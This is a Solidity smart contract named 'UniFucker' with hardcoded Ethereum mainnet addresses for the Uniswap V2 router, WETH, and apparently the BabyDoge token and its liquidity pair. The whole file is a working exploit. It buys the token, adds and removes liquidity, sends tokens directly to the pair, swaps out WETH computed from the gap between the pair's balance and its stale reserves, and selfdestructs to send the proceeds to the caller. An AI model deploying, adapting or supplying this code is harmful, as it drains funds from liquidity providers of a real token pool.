pragma solidity ^0.8.0;

interface IRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}

interface IWETH {
    function withdraw(uint256) external;

    function balanceOf(address) external returns (uint256);
}

contract UniFucker {
    address private router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private babydoge = 0xAC8E13ecC30Da7Ff04b842f21A62a1fb0f10eBd5;
    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private pair = 0xaBa7AF37dBDC67b7463917e483B55340d153928A;

    constructor() payable {
        IERC20(babydoge).approve(router, type(uint256).max);
        IERC20(pair).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = babydoge;
        IRouter(router).swapETHForExactTokens{value: address(this).balance}(
            10000,
            path,
            address(this),
            block.timestamp + 240
        );
    }

    function A() external payable {
        (, , uint256 amount) = IRouter(router).addLiquidityETH{
            value: address(this).balance
        }(
            babydoge,
            IERC20(babydoge).balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 240
        );

        IRouter(router).removeLiquidityETHSupportingFeeOnTransferTokens(
            babydoge,
            amount,
            0,
            0,
            address(this),
            block.timestamp + 240
        );
        (uint256 amount0, , ) = IPair(pair).getReserves();
        IERC20(babydoge).transfer(
            pair,
            IERC20(babydoge).balanceOf(address(this))
        );
        address[] memory path = new address[](2);
        path[0] = babydoge;
        path[1] = weth;
        uint256[] memory amounts = IRouter(router).getAmountsOut(
            IERC20(babydoge).balanceOf(pair) - amount0,
            path
        );
        IPair(pair).swap(0, amounts[1], address(this), new bytes(0));
        IWETH(weth).withdraw(IWETH(weth).balanceOf(address(this)));
        // payable(msg.sender).transfer(address(this).balance);
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
